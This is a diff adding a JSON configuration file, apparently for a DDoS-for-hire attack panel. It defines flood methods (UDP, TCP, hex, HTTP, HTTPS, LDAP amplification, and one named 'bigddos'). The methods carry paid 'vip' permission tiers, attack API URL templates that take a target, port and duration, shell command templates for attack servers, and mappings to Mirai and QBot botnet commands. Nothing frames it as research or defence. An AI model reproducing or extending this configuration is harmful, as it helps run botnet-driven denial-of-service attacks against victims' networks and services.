@@ -1,0 +1,103 @@
+[
+    {
+        "name": "udp",
+        "time": 120,
+        "description": "Udp Flood",
+        "group": "test",
+        "default port": 80,
+        "default time": 100,
+        "permission": [],
+        "api": [
+            "http://<hostname>/api/attack?username=<<$user>>&api_key=<<$key>>&target=<<$host>>&port=<<$port>>&time=<<$time>>&method=realmethodname"
+        ],
+        "server": [
+            {
+                "name": "omega",
+                "command": "./udp <<$host>> <<$port>> <<$time>>"
+            },
+            {
+                "name": "alpha",
+                "command": "wall <<$host>> <<$port>> <<$time>>"
+            }
+        ],
+        "botnet": {
+            "qbot": "udp",
+            "mirai": "udp"
+        }
+    },
+    {
+        "name": "tcp",
+        "time": 120,
+        "description": "tcp Flood",
+        "permission": ["vip"],
+        "api": [
+            "http://link.one",
+            "http://link.two",
+            "http://link.three"
+        ]
+    },
+    {
+        "name": "hex",
+        "time": 120,
+        "description": "Hex Flood",
+        "api": [
+            "http://rhex.api.example"
+        ],
+        "botnet": {
+            "mirai": "hex"
+        }
+    },
+    {
+        "name": "rhex",
+        "time": 120,
+        "description": "Random Hex Flood",
+        "permission": ["vip"],
+        "api": [
+            "http://rhex.api.example"
+        ],
+        "botnet": {
+            "mirai": "rhex"
+        }
+    },
+    {
+        "name": "http",
+        "time": 120,
+        "description": "HTTP Flood",
+        "permission": [],
+        "api": [
+            "http://http.api.example"
+        ],
+        "botnet": {
+            "qbot": "http"
+        }
+    },
+    {
+        "name": "https",
+        "time": 121,
+        "description": "HTTPS Flood",
+        "api": [
+            "http://link.one"
+        ],
+        "botnet": {
+            "qbot": "https"
+        }
+    },
+    {
+        "name": "ldap",
+        "time": 120,
+        "description": "ldap amplification Flood",
+        "permission": ["vip", "admin"],
+        "api": [
+            "http://link.one"
+        ]
+    },
+    {
+        "name": "bigddos",
+        "time": 2111,
+        "description": "hacker",
+        "permission": [],
+        "botnet": {
+            "mirai": "udp"
+        }
+    }
+]
